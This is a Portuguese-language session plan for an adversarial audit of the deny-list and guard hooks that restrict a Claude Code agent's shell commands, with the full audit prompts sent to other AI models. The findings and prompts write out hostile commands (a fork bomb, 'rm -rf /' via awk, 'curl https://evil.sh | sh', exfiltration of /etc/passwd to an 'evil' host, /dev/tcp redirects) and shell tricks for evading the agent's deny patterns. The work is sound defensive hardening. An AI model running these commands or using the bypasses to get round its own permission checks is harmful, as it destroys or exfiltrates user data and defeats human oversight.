# Adversarial Round S242 — Audit Externa S241 ADOPTs + ADR-0006

> **Sessão:** S242 `adversarial-round` | **Data:** 2026-04-23 | **Plan ID:** glimmering-coalescing-ullman

## Context

S241 `infra-plataforma` shipped **5 ADOPTs + 1 refactor** baseados em SOTA research de 3 agents paralelos (Anthropic/Competitors/Frontend). Agent research detectou **33% taxa de erro em claims "AUSENTE"** (KBP-32), sinalizando que validação intra-sessão é frame-bound (KBP-28): auditor e autor compartilham premissas. Trilha C do HANDOFF S241 marca S242 como **audit externa** — 3-prong attack por modelos diferentes (Claude.ai externo + Codex GPT-5 + Gemini) atacando os mesmos alvos sob frames independentes.

**Alvos sob audit (5 commits + 1 ADR):**

| Commit | Natureza | Arquivo-chave | Frame risk |
|---|---|---|---|
| `533d648` | `$schema` em settings.json | `.claude/settings.json:1-2` | Baixo (1-linha) |
| `e5cf330` | `@property` OKLCH 6 tokens solid★ | `content/aulas/shared-v2/tokens/reference.css:25-68` | Médio (PoC claim "habilita animação") |
| `7edf5d9` | `statusMessage` em Stop[0]/Stop[1] | `.claude/settings.json:370,380` | Baixo |
| `36feffe` | Deny-list refactor HIGH-RISK only | `.claude/settings.json permissions.deny` | **Alto (segurança)** |
| `7e205a3` | StopFailure hook skeleton | `hooks/stop-failure-log.sh` (29 li) | **Médio-Alto (bash correctness + observability paradox)** |
| `3d62433` | ADR-0006 deny-list classification | `docs/adr/0006-*.md` | **Alto (taxonomia de security)** |

Push state: **branch `main` up-to-date com `origin/main`, todos os S241 commits já no remote**. Nada a push.

---

## Executive Digest (S242 FINAL consolidation, 2026-04-23, ~75min)

### Todos retornos completos

| Source | Status | Output | Effort |
|---|---|---|---|
| Claude.ai (Opus externo) | ✅ | `.claude-tmp/adversarial-claude-ai-output.md` | copy-paste |
| Gemini 3.1 | ✅ | `.claude-tmp/adversarial-gemini-output.md` | copy-paste |
| Codex C (frontend) | ✅ sync | `.claude-tmp/codex-audit-batch-c.md` | 19 min, 14 tools |
| Codex A v2 (security) | ✅ async | `.claude-tmp/audit-batch-a-v2.md` | 8.6 min, 14 tools |
| Codex B v2 (hook) | ✅ async | `.claude-tmp/audit-batch-b-v2.md` | 7.9 min, 7 tools |

Codex A/B originais dispatch-and-exited sem escrever file — superseded. **Lição KBP candidate:** `codex:codex-rescue` tem dispatch-and-exit failure mode (agents retornam fake-done em 36-42s); `general-purpose` agent faz audit síncrono correto. Preferir general-purpose para audit work exceto quando codex runtime é explicitamente necessário.

### Spot-checks validados (KBP-32 aplicado 4x)

- Guard expansion claim (Opus externo) → ✅ 8/9 patterns (gap: `patch`)
- F01 CRITICAL claim → ✅ downgrade validado por Codex A v2 **independentemente** (`Bash(exec *)` cobre `exec 3<>/dev/tcp/...`)
- F02 LD_PRELOAD Linux-only → ✅ platform-aware filter aplicado
- F05 set -euo paradox → ✅ CONFIRMED por Codex B v2 com evidência **linha-por-linha** (8 bugs L2-L26)

### 32 findings consolidados

**HIGH (11):**
- **F01** `/dev/tcp` redirect sem exec → DENY-6 nova
- **F02** Env hijack PYTHONPATH/PATH/NODE_OPTIONS (LD_PRELOAD Linux-only) → DENY-5 nova
- **F03** awk/find-exec/xargs/make bypassam DENY-2 (sem -c flag) → alargar + tokenization
- **F05** stop-failure-log.sh 8 bugs internos (set -euo paradox + derivados) → refactor completo
- **F08** Prefix-glob insuficiente — **UPGRADED LOW-MED → HIGH** (7 bypasses empíricos em Codex A v2 validam estrutural)
- **F17** `/bin/bash -c`, `/bin/sh -c` absolute path (prefix Bash(bash -c*) não casa) → deny or tokenize
- **F19** `xargs bash -c`, `xargs sh -c` → deny Bash(xargs *) or tokenize
- **F20** `find . -exec bash -c` (find * -delete só cobre -delete, não -exec) → deny Bash(find * -exec *)
- **F21** `env bash -c` → deny Bash(env *)
- **F22** `pwsh -c`, `cmd.exe /c` — **Windows-critical** (pwsh sempre em Win 11) → deny essential
- **F23** `python -Ic` combined flag (escapa deny `-c *` E guard Pattern 7) → ajustar Pattern 7 regex + deny

**MED (10):**
- F04 symlink TOCTOU (ln detectado sem realpath) → guard realpath check
- F06 observability silent recursion → resolvido por F05 refactor
- F07 `patch` gap deny + guard → add guard pattern
- F14 @property 0 usos em animation (dead code live) → hold 6, não expandir
- F16 duplicação conceptual 3 loci (v1+v2+bridge) → ADR-0007 migration posture
- **F24** git rev-parse → pwd em /tmp break (dispara source de path inexistente) → defensive check
- **F25** `. hook-log.sh` missing → source retorna 1 → set -e fires (fresh deploy failure mode) → defensive pré-source
- F26 jq pipeline pipefail (\|\| echo dentro de $() não salva parent) → jq restructure
- F27 `.claude` guard exit 1 viola "sempre exit 0" → return 0 após log warn
- F28 $REASON unescaped JSON (quotes/newlines/\\ corrompem JSONL — Windows crítico) → jq -R raw escape
- F30 grep -oP sem PCRE detection (BusyBox/macOS fail) → platform detect + fallback
- F31 StopFailure sem statusMessage → último Stop[0] stuck na UI → add statusMessage

**LOW / LOW-MED (4):**
- F09 fork bomb (single-user reboot-recovery) → nota DENY-1
- F15 sync drift risk `initial-value` ↔ `:root` → comentário canonical
- F18 `curl ... | bash` pipe (curl sem -o não em deny; pipe to bash não é prefix; mas Bash(sh*) DENY-3 parcial) → investigar coverage real
- F29 stdin closed retorna vazio não "{}" → default `INPUT="{}"`

**INFO (4):** F10-F13 Gemini trade-offs (whitelist vs deny; ADK observ > OLMO macro; M3 usa HCT; A2A overkill)

**Refinement:** F32 sentinel `>>` append vs `>` rewrite (preserve histórico consecutivo)

**Totais:** 0 CRITICAL · **11 HIGH** (triplicou vs 3 pré-v2) · 10 MED · 4 LOW/LOW-MED · 4 INFO · 1 refinement

### Patches agrupados por arquivo

| Arquivo | Mudanças | Findings |
|---|---|---|
| `.claude/settings.json` permissions.deny | +13 patterns: `Bash(*/dev/tcp/*)`, `Bash(*/dev/udp/*)`, `Bash(*PYTHONPATH=*)`, `Bash(*PATH=*)`, `Bash(*NODE_OPTIONS=*)`, `Bash(patch *)`, `Bash(/bin/bash*)`, `Bash(/bin/sh*)`, `Bash(pwsh*-c*)`, `Bash(cmd.exe *)`, `Bash(xargs *)`, `Bash(find * -exec *)`, `Bash(env bash*)`/`Bash(env sh*)` | F01, F02, F07, F17, F19, F20, F21, F22 |
| `.claude/settings.json` hooks.StopFailure | Add `statusMessage: "StopFailure: registrando erro..."` | F31 |
| `.claude/hooks/guard-bash-write.sh` | realpath check em Pattern 14 (ln); +pattern `patch`; ajustar Pattern 7 (python -Ic combined); (opcional) tokenization function | F03, F04, F07, F23 |
| `hooks/stop-failure-log.sh` | Refactor 10 bugs: remove `set -euo pipefail`; sentinel `>>` append antes de tudo; defensive `[[ -f hook-log.sh ]]` pré-source; jq restructure (pipefail-safe); `$REASON` escape via `jq -R -s`; stdin default `INPUT="{}"`; grep platform detect; return 0 em vez de exit 1; guard .claude check return não exit | F05, F06, F24-F30, F32 |
| `docs/adr/0006-olmo-deny-list-classification.md` addendum | DENY-5 env manipulation; DENY-6 rede raw (/dev/tcp); DENY-2 alargamento "código arbitrário como argumento" (awk/find-exec/xargs/make/git filter-*); DENY-3 alargamento "indirection" (symlink + absolute path shells); DENY-7 nova "Windows shells" (pwsh/cmd.exe); DENY-1 nota fork bomb reboot-recovery | F01-F04, F09, F17-F23 |
| `.claude/rules/known-bad-patterns.md` | KBP-33 "Prefix-glob insuficiente — **validado empiricamente por 7 bypasses em Codex A v2**. Guard tokenization é defesa primária, não deny-list expansion." | F08 |
| `content/aulas/shared-v2/tokens/reference.css` | Comment header sync invariant com `:root` | F15 |
| Novo: `docs/adr/0007-shared-v2-migration-posture.md` | Migração agressiva (remove v1 base.css) vs bridge indefinido vs freeze | F16 |

### Decisões para Lucas

1. **Commit checkpoint** (nudge 66min, 3 untracked): plan file + .claude-tmp outputs como "S242 adversarial findings consolidated" ANTES de patches. Recomendação: **sim — checkpoint agora** (.claude-tmp é untracked dir via convention; só plan file entra em commit).
2. **Scope de aplicação S242 (escolher um):**
   - **Minimalista (~2h):** ADR-0006 addendum + 3 HIGH críticos (F01 DENY-6 patterns + F02 DENY-5 patterns + F05 stop-failure refactor). F17-F23 docs apenas.
   - **Médio (~4h):** + todos patches config (.settings.json completo + guard ajustes small) + StopFailure statusMessage. F17-F23 patterns adicionados (sem tokenização).
   - **Completo (~8h+):** + guard tokenization function (F03/F08 resolução estrutural) + ADR-0007 + KBP-33.
3. **F08 strategic path:** (a) expandir deny com +13 patterns ad hoc (proposto), (b) migrar para guard tokenização real (correto médio prazo), (c) aguardar Anthropic `permissions.sandbox` runtime. A é quick-fix, B é investimento maior.
4. **F22 Windows shells:** OLMO é Windows — pwsh + cmd.exe são alto risk. Mas: há uso legítimo em agents? Investigar agent scripts antes de deny final.
5. **F05 upgrade MED → HIGH:** Codex B v2 confirmou 8 bugs linha-por-linha. stop-failure-log.sh não production-ready. Refactor obrigatório se manter o hook.
6. **F16 ADR-0007:** agora (bundle) ou sessão dedicada (shared-v2 C5 metanalise seria convergência natural)?

---

## Deliverables

### D1 — Claude.ai adversarial prompt (Lucas cola 1x)

Frame: **Opus externo auditando Opus interno** com lente KBP-28 (frame-bound). Filosófico/arquitetural. Ataca ADR-0006 taxonomy + velocity risk + observability paradox + deny-list incompleteness via frame.

Texto completo em **§Prompt 1 — Claude.ai** abaixo.

### D2 — Codex batches via `codex:rescue` (3 paralelos)

Concretos, code-level audit. Cada batch escreve output em `.claude-tmp/codex-audit-batch-{a,b,c}.md` (read-only, não modifica código).

- **Batch A (Security):** deny-list bypasses + ADR-0006 Category 4 gaps + shell-within-shell corner cases
- **Batch B (Hook robustness):** stop-failure-log.sh shell correctness + grep -P portability + statusMessage UX
- **Batch C (Frontend):** @property syntax + animation-readiness proof + dead-code check + inheritance semantics

Textos completos em **§Prompts 2/3/4 — Codex batches** abaixo.

### D3 — Gemini read-only prompt (Lucas cola 1x)

Frame: **Google ADK perspective**, mapa de trade-offs cross-vendor. Não prescritivo. 4 dimensões: security, observability, frontend tokens, orchestration.

Texto completo em **§Prompt 5 — Gemini** abaixo.

---

## Execution order (pós-approval)

1. **Session setup:** write `.claude/.session-name` = `adversarial-round` (statusline).
2. **Launch 3 Codex batches em paralelo** via `Agent(subagent_type=codex:codex-rescue, ...)` ou skill `codex:rescue` — 1 mensagem com 3 tool calls.
3. **Entregar ao Lucas** os textos D1 + D3 (Claude.ai + Gemini prompts) para copy-paste external.
4. **Aguardar retorno** dos 3 Codex reports + Claude.ai output + Gemini output.
5. **Consolidação:** merge findings em `.claude/plans/glimmering-coalescing-ullman.md §Findings` com severity ranking (CRITICAL/HIGH/MED/LOW); decidir: accept findings → criar backlog items; reject → ADR justification.
6. **HANDOFF + CHANGELOG update** com session close.

---

## §Prompt 1 — Claude.ai (D1)

```
Você é um senior reviewer em Anthropic, auditando trabalho de outro Opus. Frame: KBP-28 (adversarial testing frame-bound — autor e validator compartilharam premissas). Sua tarefa: achar o que o autor NÃO formulou como hipótese.

Contexto — session S241 do OLMO (projeto dev AI de um médico+pesquisador, consumer Claude Code stack). Shippeu 5 ADOPTs + 1 refactor em 1 dia:

1. $schema em .claude/settings.json (URL: https://json.schemastore.org/claude-code-settings.json)
2. @property OKLCH tokens solid★ — 6 tokens em shared-v2/tokens/reference.css: --oklch-neutral-9, --oklch-accent-6, --oklch-success-5, --oklch-warning-5, --oklch-danger-5, --oklch-info-5. Todos syntax "<color>", inherits: true, initial-value oklch(<L%> <C> <H>).
3. statusMessage em Stop[0] (type prompt) + Stop[1] (type agent) — indica ao user durante hook long-running qual check está correndo.
4. Deny-list refactor em settings.json — 9 patterns benignos REMOVIDOS do deny (cp, mv, install, rsync, tee, truncate, touch, sed -i, patch) e delegados a hook guard-bash-write.sh com permissionDecision:"ask". Mantidos 23 HIGH-RISK (9 MCP blocks + 14 bash incl. rm -rf, dd, bash -c*, eval *, curl * -o *, tar *x*, etc.).
5. StopFailure hook skeleton — bash script 29 li em hooks/stop-failure-log.sh: lê stdin JSON, extrai .reason/.error/.message via jq (fallback grep -oP), delega a hook_log() de lib/hook-log.sh, sempre exit 0.
6. ADR-0006 classifica permissions.deny em 4 categorias: DENY-1 irrecuperável (rm -rf, git checkout --), DENY-2 código arbitrário inline (python -c, node -e), DENY-3 shell-within-shell (bash -c*, eval *), DENY-4 fetch não-verificado (curl -o, tar x, wget -O). Patterns benignos vão para ASK via guard.

Critério OLMO (ler antes de atacar):
- KBP-26: permissions.ask está broken em Claude Code ≥2.1.113 (bug Anthropic) — pode degradar silenciosamente para "allow". Arquitetura deve assumir esse failure mode.
- KBP-28: adversarial testing é frame-bound. S227 validou deny-list dentro do frame "Bash(*) é o problema?" e não simulou shell-within-shell — commit 9ef3b78 precisou adicionar 7 patterns posteriormente.
- KBP-32: agents SOTA research têm 33% taxa de erro em claims "AUSENTE" (Agent 1 disse paths: ausente em rules — estavam em 3 files). Spot-check Grep/Read é obrigatório antes de Edit.

SUA AUDITORIA em 4 partes. Em cada parte, ataque um ponto que o autor NÃO formulou como hipótese. Evite aplaudir — se o trabalho está sólido em alguma parte, diga, MAS encontre pelo menos 1 furo real por parte antes de endossar.

(1) ADR-0006 TAXONOMY COMPLETENESS
As 4 categorias (irrecuperável / código arbitrário / shell-within-shell / fetch não-verificado) cobrem o que o autor imaginou. Questão: há classe de ataque NÃO coberta por essas 4 categorias? Considere especificamente:
  - side-channel (timing attacks, resource exhaustion via fork bomb como `:(){ :|:& };:`)
  - mutation-by-reference (symlink races, TOCTOU via ln -sf /etc/passwd /tmp/x && cat /tmp/x)
  - escalation-via-env (PATH hijack, LD_PRELOAD, PYTHONPATH injection em ambiente do subagent)
  - file-descriptor manipulation (exec 2>&1, >/dev/tcp/*)
Output: enumerar classes ausentes. Para cada, propor: (a) categoria DENY-5 separada OU (b) absorção em uma das 4 existentes + expansion do critério. Critério meta para decidir: quando fragmentar vs absorver?

(2) VELOCITY RISK QUANTIFICATION
5 ADOPTs em 1 sessão, com SOTA research mostrando 33% taxa de "AUSENTE" errado. Questão: sob assumption de independência dos 5 ADOPTs, qual P(≥1 commit tem cascading impact não-medido)? E sob assumption de correlação (3 commits tocam mesmo settings.json)? Qual commit é MAIS provável de ser o problema — justificar via LOC touched + novidade do pattern + ausência de testes.

(3) OBSERVABILITY PARADOX
StopFailure hook observa falhas de outros Stop hooks (API errors, timeout). Mas o próprio script tem `exit 0` sempre + `set -euo pipefail`. Se `hook_log()` falhar (filesystem full, lib/hook-log.sh missing, jq ausente E grep -P indisponível), a falha é silenciada porque set -e aborta ANTES de atingir exit 0, OU hook_log engole o erro. Questão: quem observa o observador? Proponha mitigation que NÃO seja meta-hook (recursão óbvia) e que NÃO adicione dependência externa (OLMO é offline-first). Espaço de soluções: 2nd-level filesystem write test? Sentinel file? systemd journal (não disponível Win)? Alternativa client-side (Claude Code detect hook silent failure)?

(4) DENY-LIST INCOMPLETENESS VIA FRAME
Os 23 patterns (9 MCP + 14 bash) cobrem DENY-1/2/3/4 como o autor os entendeu. Enumere 3-6 COMANDOS QUE PASSARIAM pelo deny + guard atual mas deveriam bloquear. Exemplos pra começar (encontre mais):
  - `bash\t-c 'rm -rf /'` (tab at whitespace — prefix match quebra?)
  - `python -Ic 'import os; os.system(...)'` (interactive mode)
  - `awk 'BEGIN{system("rm -rf /")}'` (awk syscall)
  - `find . -exec bash -c '...' \\;` (exec via find — passa o deny?)
  - `make target` onde Makefile tem `$(shell evil)`
Para cada: comando exato + por que o deny-list atual não pega + qual categoria DENY-N deveria absorver + severity (CRITICAL/HIGH/MED/LOW).

FORMATO OUTPUT:
- Part 1: lista classes ausentes + categoria proposta (5ª nova OR absorção) + critério meta
- Part 2: número P(≥1 bug), cálculo independence + correlation, commit mais provável + rationale
- Part 3: mitigation concreta para observability paradox (1 approach recomendado + 2 alternativos brevemente)
- Part 4: table de 3-6 comandos bypass com exploit sketch

Seja direto. Sem "como AI reviewer...". Sem hedging. Opiniões fortes OK — o autor vai defender ou ceder com base em argumento, não em tom.
```

## §Prompt 2 — Codex Batch A — Security (D2-A)

```
Adversarial shell-security audit sobre OLMO project. READ-ONLY — não modifique código, não execute commandos de destruição.

Alvo: commits 36feffe (deny-list refactor) + 3d62433 (ADR-0006).

Files para context (leia em ordem):
1. .claude/settings.json — campo permissions.deny (23 patterns atuais pós-refactor)
2. docs/adr/0006-olmo-deny-list-classification.md — 4 categorias DENY + 3 ASK
3. .claude/rules/known-bad-patterns.md — KBP-10, KBP-26, KBP-28 (contexto de porque deny existe)
4. .claude/hooks/guard-bash-write.sh — handles patterns removidos do deny (cp, mv, rsync, tee, truncate, touch, sed -i, patch, install)
5. CLAUDE.md §"CC schema gotchas" — nota sobre prefix-match de deny-list

Sua tarefa (3 eixos):

EIXO 1 — BYPASS DA DENY-LIST (prefix-match precedence)
Para cada pattern nas 4 categorias DENY-1/2/3/4, identifique bypasses usando shell arcano que PASSARIA prefix-match. Técnicas a considerar:
  - IFS manipulation (IFS=$'\\n'; IFS=$'\\t')
  - brace expansion (r{m,m} -rf / — reconstroi "rm" via brace)
  - process substitution `<(cmd)`, `>(cmd)`
  - $'\\x...' hex escapes ou $'\\u...'
  - tab vs space separators em argumentos (`bash\\t-c` vs `bash -c`)
  - backslash line continuation (`rm\\\n -rf`)
  - locale-dependent globbing (LC_ALL=C alterando comportamento glob)
  - quoting tricks (`'rm' -rf`, `"rm" -rf`, rm""' '-rf)
  - path indirection (`/bin/bash -c` vs `bash -c`, `env bash -c`)
  - xargs as relay (`echo rm -rf /tmp | xargs sh`)
  - ssh localhost bash -c
  - bash<<<"cmd" (herestring)

EIXO 2 — DENY-4 (FETCH NÃO-VERIFICADO) GAPS
Current DENY-4 tem: `curl * -o *`, `curl * --output *`, `wget * -O *`, `tar *x*`, `unzip *`, `7z x*`, `robocopy *`, `xcopy *`. Gaps:
  - curl sem -o (output to stdout → pipe): `curl https://evil.sh | sh`, `curl https://evil.sh | bash`. Pipe to sh está em DENY-3 (bash -c*) ou não?
  - curl --data-binary @/etc/passwd https://evil — exfiltration, não fetch
  - `git clone https://evil/repo && cd repo && make` — git clone não está em deny; Makefile pode conter `$(shell ...)` arbitrário
  - `git fetch remote-evil` onde remote foi adicionado via config
  - `pip install evil-package`, `npm install evil-package`, `go get evil` — package managers não cobertos
  - `scp user@evil:/payload .`, `rsync evil:payload .` — rsync removido do deny no refactor! Agora só passa por guard ASK (KBP-26 ask broken)
  - brew install, choco install — package managers
  - docker run evil-image, kubectl apply -f evil.yaml

EIXO 3 — SHELL-WITHIN-SHELL COMPLETENESS (DENY-3)
Current: `bash -c*`, `sh -c*`, `zsh -c*`, `eval *`, `exec *`, `source /*`, `. /*`. Bypasses suspeitos:
  - `/bin/bash -c` (path absoluto — `bash -c*` prefix NÃO casa com `/bin/bash`)
  - `/bin/sh -c`, `/usr/bin/env bash -c`
  - `fish -c`, `nu -c`, `pwsh -c` (shells alternativos)
  - `dash -c`, `tcsh -c`, `ksh -c`
  - `xargs bash -c`, `find . -exec bash -c {} \\;`
  - `screen -X exec bash -c`, `tmux new-window bash -c`
  - `cron`/`at` scheduling com comando arbitrário
  - `make` + Makefile com `$(shell ...)` (já em Eixo 2, mas shell-within-shell também)
  - `systemctl --user run cmd` (Linux only)
  - `start /b cmd` (Windows)
  - interactive mode entry: `python -Ic`, `ruby -rirb/completion -e 'IRB.start'`

Output em file `.claude-tmp/codex-audit-batch-a.md`:

Table 1: Bypasses deny-list (min 5, max 15 linhas)
| Comando exato | Pattern que deveria bloquear | Por que bypassa | Severity | Recomendação (add deny pattern ou escalate sandbox) |

Table 2: Fetch gaps (min 3, max 8 linhas)
| Gap | Comando exemplo | Threat | Recomendação |

Table 3: Shell-within-shell gaps (min 3, max 8 linhas)
| Gap | Comando exemplo | Atual cobertura | Recomendação |

Severity rubric:
- CRITICAL: exec arbitrário (cod code execution sem prompt)
- HIGH: destruição de arquivos / corrupção irreversible
- MED: info leak, exfiltration
- LOW: denial of service, annoyance

Sessão final: "Overall verdict — deny-list é robusta OU tem X bypasses críticos". 200 palavras max.
```

## §Prompt 3 — Codex Batch B — Hook robustness (D2-B)

```
Adversarial audit — shell correctness + portability. READ-ONLY.

Alvo: commits 7e205a3 (StopFailure hook) + 7edf5d9 (statusMessage em Stop[0]/Stop[1]).

Files para context:
1. hooks/stop-failure-log.sh — script 29 li, o alvo principal
2. hooks/lib/hook-log.sh — função hook_log() consumida
3. .claude/settings.json — hook config (StopFailure block em ~linha 424-433, statusMessage em Stop[0] linha ~370 type prompt, Stop[1] linha ~380 type agent)
4. CLAUDE.md §"CC schema gotchas" — timeout em type prompt/agent é SEGUNDOS, não ms
5. .claude/rules/anti-drift.md — contexto de quality gates que Stop hooks fazem

Sua tarefa (3 eixos):

EIXO 1 — SHELL CORRECTNESS de stop-failure-log.sh
Analisar linha-por-linha. Questões:
  a) `set -euo pipefail` em hook que quer exit 0 sempre — é tecnicamente contraditório? Se alguma linha antes do exit 0 falhar (ex: command substitution vazia, pipefail em `jq ... | grep`), o script aborta sem chegar a exit 0. Resultado: hook MORTE silenciosa, que é exatamente o blind spot que StopFailure quer capturar. Ironic.
  b) `grep -oP` requer GNU grep com PCRE. Matrix de disponibilidade:
     - Git Bash (MSYS2 GNU grep 3.x): OK
     - BusyBox (Alpine, minimal Docker): FAIL (sem -P)
     - macOS BSD grep default: FAIL
     - WSL Ubuntu: OK
     OLMO é Windows 11 com Git Bash, mas hook pode ser invocado em subshell não esperado?
  c) jq fallback: se jq missing, usa grep -oP. Se AMBOS missing (Docker BusyBox), REASON="" e loga com mensagem vazia. Degradação aceitável ou silent bug?
  d) Race condition: 2 StopFailure simultâneos writing to hook-log.jsonl. flock() usado? Ou append atômico <4KB? Checar se hook_log() em lib usa flock/append-only.
  e) $CLAUDE_PROJECT_DIR fallback: `git rev-parse --show-toplevel 2>/dev/null || pwd`. Se invocado de /tmp (sem git repo), pwd retorna /tmp. Resultado: loga em /tmp/hooks/lib/hook-log.sh missing → set -e abort → silent death. Bug.
  f) `[[ "$(basename "$PROJECT_ROOT")" == ".claude" ]]` — guard contra rodar de dentro de .claude. Mas CLAUDE_PROJECT_DIR é setado pelo Claude Code para o project root (não .claude). Guard é vestigial ou legítimo?
  g) JSONL schema: hook_log parameters ("StopFailure", "stop-failure-log", "stop-or-api-error", "claude-code", "warn", "$REASON") — reason pode conter chars que quebram JSON (quotes, newlines)? hook_log faz escape? Se não, log corrompe.

EIXO 2 — statusMessage em Stop[0]/Stop[1]
  a) Stop[0] é type "prompt" (Claude calls LLM with prompt) — timeout em segundos, não ms. statusMessage é exibido por quanto tempo? Se hook dura 60s, statusMessage persiste 60s na UI? Ou só até primeiro tool call?
  b) Stop[1] é type "agent" — sobrepõe statusMessage de Stop[0] ou concatena? Sequential ou paralelo por default? Checar settings.json schema.
  c) Multiline statusMessage: aceita \\n? Unicode? Emoji?
  d) Fallback: se hook falha / timeout, statusMessage é clearado ou fica stuck?
  e) Interação com StopFailure: se Stop[0] falha (timeout API), StopFailure fires. StopFailure tem statusMessage também? Se não, último statusMessage de Stop[0] fica na UI até próxima interação?

EIXO 3 — BROKEN CASES NÃO COBERTOS
Casos de falha que Stop hooks atuais + StopFailure NÃO capturam:
  - Subagent Task() call em timeout MCP — StopFailure fires? Ou só Stop[N] timeout?
  - Autocompact thrash (CLAUDE.md menciona detecção 3x) — gera StopFailure event?
  - SIGKILL (out-of-memory killer): bash traps não executam, stop-failure-log.sh NUNCA roda
  - Parent process crash (claude-code binary) — stdin nunca chega no hook
  - File lock contention em hook-log.jsonl — writer bloqueia, próximo hook timeout
  - Windows-specific: path com backslash escape em JSON (\\\\), CRLF contamination

Output em `.claude-tmp/codex-audit-batch-b.md`:

Section 1: Shell correctness bugs
| # | Linha script | Bug | Severity | Fix proposal (DIFF opcional) |

Section 2: statusMessage UX
Prosa 200 palavras: findings + recomendação.

Section 3: Coverage gaps
| Cenário | StopFailure cobre? | Mitigation suggestion |

Verdict final: hook é production-ready OU precisa revisão (X bugs CRITICAL, Y HIGH).
```

## §Prompt 4 — Codex Batch C — Frontend PoC (D2-C)

```
Adversarial audit — CSS @property correctness + PoC genuineness. READ-ONLY.

Alvo: commit e5cf330 (@property OKLCH 6 solid★ tokens).

Files para context:
1. content/aulas/shared-v2/tokens/reference.css — bloco @property (linhas ~25-68)
2. content/aulas/shared-v2/tokens/base.css — OKLCH tokens originais sem @property (comparar valores)
3. content/aulas/CLAUDE.md — slide rules (E22, scaleDeck, auditório projetor, E52 proíbe vw/vh em font-size)
4. Todos .css files em content/aulas/shared-v2/ — grep por @keyframes, animation, transition usando os 6 tokens

6 tokens registered (todos syntax "<color>", inherits: true):
  --oklch-neutral-9  (initial oklch(22% 0.020 260))
  --oklch-accent-6   (initial oklch(58% 0.220 265))
  --oklch-success-5  (initial oklch(58% 0.1433 155))
  --oklch-warning-5  (initial oklch(82% 0.1580 75))
  --oklch-danger-5   (initial oklch(55% 0.220 22))
  --oklch-info-5     (initial oklch(62% 0.1072 210))

Sua tarefa (4 eixos):

EIXO 1 — SYNTAX CORRECTNESS
  a) `syntax: "<color>"` aceita oklch() literal em initial-value? Per spec CSS Houdini Properties & Values L1: <color> é um consumer de values matching production. oklch() foi adicionado ao <color> syntax em Color Module L4 (2022). Confirmar.
  b) `inherits: true` em cores: herança cascading padrão. Mas esses tokens são usados como `background-color: var(--oklch-danger-5)` em níveis múltiplos da DOM. Se um ancestor sobrescrever `--oklch-danger-5`, descendants inherit. Intencional ou unexpected?
  c) initial-value oklch() — se browser suporta @property mas NÃO oklch() (teoreticamente impossível pos-2023 mas vale confirmar), initial-value invalido faz o @property ser ignorado silently. Ou all-or-nothing?

EIXO 2 — ANIMATION-READINESS PROOF
PoC claim: "Habilita animação nativa sem GSAP". Provar ou refutar:
  a) Escreva 1 @keyframes usando --oklch-danger-5 → --oklch-success-5 (danger to success pulse). Com @property, browser interpola em OKLCH color space (smooth). Sem @property, DOMString interpolation char-by-char (visual glitch).
  b) Buscar no repo por: ANY uso atual desses 6 tokens em @keyframes OU transition OU WAAPI element.animate(). Se 0 usos: PoC é aspiracional (OK, mas flag se houve claim de "usage in production").
  c) Teste conceitual: 2 tokens não-registrados (sem @property) + 2 registrados. Animar todos. Registrados funcionam, não-registrados quebram. Demonstrar via browser compat table.

EIXO 3 — INHERITANCE SEMANTICS + BROWSER MATRIX
  a) `inherits: true` — fazer sense pra --oklch-danger-5 usado em background-color? Uso em color CSS property herda por default. Uso em border-color herda? fill? Auditar uso real no repo.
  b) Browser matrix (OLMO target Chrome 120+ projetor):
     - @property suporte: Chrome 85+, FF 128+ (jul/2024), Safari 16.4+ (mar/2023)
     - oklch() suporte: Chrome 111+, FF 113+, Safari 15.4+
     - Baseline newly @property: jul/2024. Baseline widely: ~jan/2027.
     - Aluno secundário em notebook Chrome older → @property ignored, token usa fallback do var() definition
  c) Fallback cascade: se @property ignored, --oklch-danger-5 é regular custom property definido em base.css (provavelmente). Initial-value de @property NUNCA é usado se var() declaration existe em base.css? Checar cascade order.

EIXO 4 — DEAD CODE + SECTION AUDIT (KBP-21)
  a) 6 tokens: usados em animation/transition/@keyframes no repo atual? Grep completo.
     | Token | Usos em animation | Usos em static | Recomendação |
     | --oklch-danger-5 | X | Y | keep PoC OR expand OR trim |
     etc.
  b) base.css vs reference.css duplicação: os tokens existem em base.css ANTES do @property commit? Se sim: há risk de valor OKLCH divergir entre base.css e @property initial-value? Validar os 6 pares de valores são idênticos.
  c) KBP-21: tocar @property block → auditar ENTIRE section de tokens? Ou é isolado?
  d) E22 hazard: @import antes de @font-face regra OLMO. @property não é @import nem @font-face, mas se reference.css tem @import, ordem importa? Checar.

Output em `.claude-tmp/codex-audit-batch-c.md`:

Section 1: Syntax issues (0-3 bugs)
Section 2: 1 @keyframes exemplo (funcional) demonstrando animação OKLCH entre 2 dos 6 tokens.
Section 3: Browser matrix + fallback cascade analysis (200 palavras)
Section 4: Dead code table (6 linhas, um por token)
Section 5: base.css vs reference.css duplication findings
Verdict: PoC genuine, dead code, ou expand? Recomendação concreta.
```

## §Prompt 5 — Gemini read-only (D3)

```
Você é Gemini (Google). Sua tarefa: produzir MAPA DE TRADE-OFFS comparando approach OLMO (Claude Code consumer stack) vs Google ADK / Material Design 3 / A2A Protocol patterns. READ-ONLY — não prescreva mudanças, não gere código, não edite files. 600 palavras max.

Contexto OLMO:
- Projeto dev AI de um médico gastroenterologista (Lucas), iniciante em CLI/dev
- Runtime: Claude Code nativo. 9 subagents (.md files), 18 skills, 30 hooks. Zero runtime Python.
- Security: permissions.deny em settings.json com 4 categorias (ADR-0006): irrecuperável / código arbitrário inline / shell-within-shell / fetch não-verificado. Total 23 patterns HIGH-RISK. Patterns benignos-mas-sensíveis (cp/mv/rsync/tee) delegados a hook guard com permissionDecision:"ask". KBP-26: ask está broken em CC ≥2.1.113, pode degradar silenciosamente para allow.
- Observability: hook StopFailure loga API errors para hook-log.jsonl (bash 29 li). Sem LangSmith, sem Langfuse, sem OpenTelemetry exporter. Hook stop-quality.sh + pending-fixes.md serve como quality gate declarativo.
- Frontend: slideware próprio em HTML/CSS/JS nativo. OKLCH color system + APCA contrast + @layer 7-camadas. @property PoC commitado (6 tokens solid★). Offline-first (zero CDN). Otimizado para auditório 10m + projetor 1280×720 com scaleDeck 1.5× em 1080p.
- Concurso R3 Clínica Médica dez/2026 — target use case conteúdo médico referenciado.

Sua análise em 4 dimensões — tabela por dimensão, 3-5 linhas, objetivo e seco:

(1) SECURITY — OLMO deny-list + hook guards vs ADK `permissions.sandbox` + action_confirmations + allowed_tools
| Aspect | OLMO approach | ADK approach | Cobertura comparada | Onde cada um falha |
